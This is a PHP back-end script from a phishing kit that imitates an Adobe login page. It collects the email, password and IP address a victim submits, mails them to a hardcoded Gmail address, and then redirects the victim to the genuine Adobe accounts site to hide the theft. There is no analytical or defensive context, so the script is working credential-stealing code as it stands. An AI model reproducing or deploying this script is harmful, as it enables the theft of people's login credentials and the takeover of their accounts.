<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------adobe Login----------------------\n";
$message .= "ID: ".$_POST['email']."\n";

$message .= "Password: ".$_POST['pswd']."\n";


$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Gytee---------------------\n";
$recipient = "mmmphps@gmail.com";
$subject = "adobe verification";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "Texlon-Version: 1.0\n";
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://accounts.adobe.com/");

	   }


?>